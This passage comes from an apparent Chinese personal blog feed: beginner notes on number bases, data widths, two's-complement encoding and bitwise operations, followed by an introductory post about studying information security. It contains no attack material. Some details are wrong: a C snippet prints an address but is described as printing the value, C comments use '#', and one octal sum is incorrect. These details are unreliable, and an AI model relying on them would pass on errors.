<p>找到内存中的值搜索到address，找到对应的值位01 转化位二进制为00000001<br>
所以正数在内存中存的就是当前这个数的原码。</p>
<h3 id="负数的原码反码补码">负数的原码反码补码</h3>
<p>Ⅰ.有符号数的编码规则<br>
1原码 最高为为符号位，其余各位为数值的绝对值<br>
2反码 正数的反码跟原码相同<br>
负数：符号为为1，其余为对原码取反<br>
3补码 正数的补码跟原码相同<br>
负数：符号位为1，其余位为对原码取反加1<br>
表示 -1 原码 10000001  反码11111110  补码 11111111<br>
表示 -7 原码 10000111  反码11111000  补码 11111001</p>
<pre><code>int main(int argc,char*argv[])
{
    char x = -1;              #用到的数据宽度为8位
    printf(&quot;%x\n&quot;,&amp;x);     #打印一下这个值在内存中的位置
    return 0;
}`在这里插入代码片`在这里插入代码片
</code></pre>
<p>得出结论为-1在内存中的值为FF即<br>
！！！负数在内存中以补码的形式中存在.</p>
<h3 id="有无符号数区分表">有无符号数区分表</h3>
<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/20190808150643813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
<h1 id="六无符号有符号数">六.无符号有符号数</h1>
<p>Ⅰ.无符号数的编码规则<br>
这个数是多少就存多少<br>
10011010 是一个无符号数的话则为0x9A  数的绝对值 只有正数<br>
Ⅱ.有符号数的编码规则<br>
有符号数最高为是0的话 这个数一定是个正数<br>
有符号数最高为为1的话 这个数一定是一个负数<br>
00011010 是1A<br>
10011010 是</p>
<pre><code>int main(int argc,char*argv[])
{
    int x = 0x1A000000;
    printf(&quot;以无符号形式显示：%u\n&quot;,x);
    printf(&quot;以有符号形式显示：%d\n&quot;,x);
    return 0;
}
</code></pre>
<p>以无符号形式显示：436207616<br>
以有符号形式显示：436207616<br>
则说明有符号数为正时与无符号形式的编码方式是一样的。</p>
<pre><code> int main(int argc,char*argv[])
{
    int x = 0x9A000000;
    printf(&quot;以无符号形式显示：%u\n&quot;,x);
    printf(&quot;以有符号形式显示：%d\n&quot;,x);
    return 0;
}
</code></pre>
<p>以无符号形式显示：2583691264<br>
以有符号形式显示：-1711276032<br>
0x9A时  10011010<br>
-1,711,276,032‬<br>
FFFF FFFF 9A00 0000‬<br>
1111 1111 1111 1111 1111 1111 1111 1111 1001 1010 0000 0000 0000 0000 0000 0000‬</p>
<h2 id="七计算机中的运算">七.计算机中的运算</h2>
<p>运算<br>
计算机只认识0和1，归根结底计算机就是对0和1做运算（通常成为位运算）<br>
1 与运算<br>
两个位都为1时结果才为1<br>
1011 0001<br>
and（＆）     1101 1000<br>
1001 0000<br>
2.或运算<br>
只要有一个位为1就是1<br>
1011 0001<br>
or(|)        1101 1000<br>
1111 1001<br>
3.异或运算<br>
不一样的时候是1<br>
1011 0001<br>
xor(^)       1101 1000<br>
0110 1001<br>
4.非运算<br>
0就是1，1就是0<br>
1101 1000<br>
not（~）      0010 0111<br>
5.左移<br>
各二进位全部左移若干位，高为丢弃低位补零<br>
sh(&lt;&lt;)   1101 1000 左移两位为：0110 0000<br>
6.右移<br>
sar 11010101 1111 0101<br>
对应C语言（&gt;&gt;）<br>
int a = 10;<br>
printf(&quot;%d\n,a&gt;&gt;2&quot;);</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[编程学习基础－－进制学习笔记整理（上）]]></title>
        <id>https://meowketer.github.io/post/jinzhishang/</id>
        <link href="https://meowketer.github.io/post/jinzhishang/">
        </link>
        <updated>2019-08-04T14:15:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="关于笔记">关于笔记</h1>
<p>这篇笔记的整理是围绕的进制的学习以及汇编基础的学习<br>
为啥要学这些基础的东西嘞？<br>
像是进制，从小学的计算机课中就开始出现在课本上了<br>
大概就是学了很多年，也一直没搞清楚二进制于十进制的转化这样简答的事情。<br>
由于在最近的阶段需要学习一些编程语言，来进一步完成对漏洞挖掘等相关知识的理解，所以我就准备从最基础的一些东西来学习，因为将来很长一段时间可能需要面对二进制以及十六进制形式的数据咯。当然通过汇编来进一步了解程序在运行过程中对硬件底层的实质原理等。所以开始补补基础的东东辽。之前在学习的过程中是通过jupyter笔记本来做记录的，虽然能完成笔记的记录作用但是总的来说还是有点散乱。</p>
<hr>
<h1 id="一进制">一．进制</h1>
<p>1.计算机中只认识二进制，0和1 首先要理解什么是进制。</p>
<p>2.进制的学习姿势<br>
进制学习过程中转化为其他进制来理解是错误的学习方式<br>
例如学习二进制总把它转化为十进制来理解，进制之间本是相对独立的，要单独针对于某一个进制本身来学习及理解 忘掉进制间的转化，改变对于十进制过于熟悉的理解方式来转化学习其他进制。</p>
<p>3.进制的定义<br>
例如八进制的定义：由八个符号组成，分别是0 1 2 3 4 5 6 7 逢八进一。 N进制定义：由N个符号组成，逢N进一。</p>
<p>4.进制的书写<br>
1.查数（三进制来举例子） 2.进位☆<br>
0   1   2       　　 　  #当0  1  2 之后查第二行时  需要两个数字来表达先用00填空开始查数<br>
10  11   12       　　 #由于第一行已经到2 所以要进位则00中后面那个位进位查数为0第一个位再次向后查数为1<br>
20  21   22       　　 #由上一行结尾12 由2进位一位为0由1进位一位为2则下一个数为20<br>
100 101  102      　 # 22进位 最后一位2查下一个数为0 第一个2查数为0进1 22的下一个数位100<br>
110 111  112<br>
120 121  122      　 # 112 2进位0进1 第二位1加进的1为2 120<br>
200 201  202<br>
所以总结来说，每一种进制的存在都是独立而完美的通过查数来完成进制的书写</p>
<h1 id="二进制运算">二．进制运算</h1>
<p>1.运算的本质也是查数。<br>
例如8进制的运算</p>
<p>0 1 2 3 4 5 6 7 10 11 12 13 14 15 16 17 20 21 22 23 24 25 26 27 ...<br>
2+3=?则为从2开始向后查三个数为5<br>
2<em>3=？为两个3或三个二向后查数为6<br>
4+4=？为4开始向后查5个数为11<br>
4</em>5=？从第一个5开始往后查三组5一共四组为24</p>
<h1 id="三二进制十六进制">三．二进制&amp;十六进制</h1>
<p>计算机为啥使用二进制？<br>
计算机通电工作，电路只有两种状态：1（通电）0（未通电） 计算机储存的任何文件，接收任何指令都是0和1组成的。</p>
<p>二进制的书写<br>
0000  0001  0010  0011  0100  0101  0110  0111  1000  1001  1010  1011  1100  1101  1110  1111<br>
其中，依次一一对应的十六进制为：<br>
0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F</p>
<p>要习惯于十六进制因为十六进制一些方面来说是二进制的简写形式</p>
<p>十六进制存在在计算机中最大的价值就是二进制的简写形式，它方便人们的阅读。要习惯他们的对应关系例如：<br>
6D 6F 64 65　　　　依次对应的二进制：<br>
0110 1101 0110 1111 0110 0100 0110 0101</p>
<h1 id="四数据宽度">四．数据宽度</h1>
<p>１.什么时数据宽度？<br>
在计算机中，由于受硬件的约束，数据都是有长度限制的，这个长度限制称之为数据宽度。<br>
当然，超过最多宽度数据将被丢弃。</p>
<p>２.常见的数据宽度：<br>
（1）位（bit） 只能存一个数值<br>
（2）字节（byte）由八个位组成<br>
（3）字（word）十六个位<br>
（4）双字（doubleword）32位</p>
<p>3.字节存储的范围：<br>
八个位当中从00000000到11111111 十六进制则为00到FF<br>
即：<br>
字节：0～0xFF<br>
字 ： 0～0xFFFF<br>
双字：0～0xFFFFFFFF</p>
<p>如果储存的数据超过最大宽度，多余数据将被丢弃！<br>
例如C语言中的 char x = 0x1FF   (char)位 在这个实例当中 1会被丢弃<br>
　　　　   int(32双字)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[写博客：记录，分享&收获]]></title>
        <id>https://meowketer.github.io/post/xie-bo-ke-ji-lu-fen-xiang-andshou-huo/</id>
        <link href="https://meowketer.github.io/post/xie-bo-ke-ji-lu-fen-xiang-andshou-huo/">
        </link>
        <updated>2019-07-28T16:09:41.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2">第一篇博客</a>
<ul>
<li><a href="#%E5%85%B3%E4%BA%8E%E6%88%91">关于我</a></li>
<li><a href="#%E9%80%89%E6%8B%A9">选择</a></li>
<li><a href="#%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2">我的博客</a></li>
</ul>
</li>
</ul>
(对待博客的认识&amp;准备)</p>
<h1 id="第一篇博客">第一篇博客</h1>
<p>在这之前我从来没有认真写过博客，对于博客虽然很早就有听说过，但是对它的概念一直很模糊。</p>
<p>直到前不久，我意识到无论是在生活中还是在学习技术的过程中，有太多的想法与细节需要放到一个地方做总结与整合。它的作用不仅仅只是记录。更多的是一种分享，尤其是技术方面而言。在我学习的过程中查阅过的大量资料，这便是有过前车之鉴的朋友们所做的知识整合与分享。</p>
<p>如果有人问我为什么也要准备开始分享自己花费不少时间一点点摸索一点点积累的一些知识呢？我会毫不犹豫的回答到，在我学习的过程中本就是借鉴了其他人大量的分享，正因为有着许多人共同的分享，才使得相关领域的技术以及知识不断的向前更新迈步。也正因为我们踩着巨人的肩膀所以我们一直有收获与进步~</p>
<p>所以，博客便是这样一个记录与分享的平台。我的分享与记录也便从此开始~<br>
开始慢慢的写文章（虽然没有啥文笔可言）开始点滴记录我所走过的坑（虽然技术菜的一批）开始分享我的经验（虽然现在一点经验都没有）开始追逐大佬们的步伐（这个是真的诶！！）</p>
<h2 id="关于我">关于我</h2>
<p>大家好，我是Winghr</p>
<hr>
<p>关于我<br>
大概在四五年前第一次接触到黑客这样的名词，，感觉什么远控啊，攻击其他人的网站啊还有满屏的五颜六色的代码啊啥的感觉太帅惹~~~（现在想想真的好沙雕）</p>
<p>但由于当时只是好奇、加上学业繁重，，并没有形成多浓厚的兴趣便一直处于好奇的阶段，在两年前的一天把好奇转为了兴趣，于是慢慢踏入了信息安全的大门，在两年的时间内没有啥方向一直就是这儿学点儿那学点儿的，虽然了解了很多但是没有啥精通一点的东东。</p>
<p>后来有幸认识了一个相关行业的导师跟他交流了很多，了解到在信息安全领域中，像是我这样前期找不到方向便去多方面的“但当涉猎”也是有好处滴，因为信息安全的领域很大要学习和努力的地方本就很多。so.在找到一个确切方向之前我还是会学习很多知识，尤其是最基础的一些东东。</p>
<h2 id="选择">选择</h2>
<p>在一个月前我慢慢发现我对于很多知识点的整理与积累不够系统，有些知识的整合例如CTF练习题的wp放在了文件夹中，有些像是二进制汇编等知识的学习笔记放在了jupyter笔记本中，也有一些文章写在了一些论坛中。</p>
<p>有看过很多大佬写的关于博客的文章，例如：为什么要写博客，，，写博客的种种好处。。。。嗯，，说的很对，让我有好多的收获。<br>
总结来讲就是记录，分享以及收获~</p>
<p>记录一些好的点子以及技术细节，分享你的经验与研究成果，收获一份意义与价值。</p>
<h2 id="我的博客">我的博客</h2>
<p>在写这些文章的过程，我会经历回顾整理知识的阶段，能在中国阶段中获得对知识巩固与更深的理解。这本是一种收获。<br>
如果我的分享能给他人带来一些帮助，解决一些问题，我的这份分享便也会有一份意义咯，这也是一份沉淀的收获把~</p>
<p>所以即便我的博客没有一个人看，我也会坚持去写，，因为总有一天会通过这一点点的积累收获很多很多~</p>
]]></content>
    </entry>
</feed>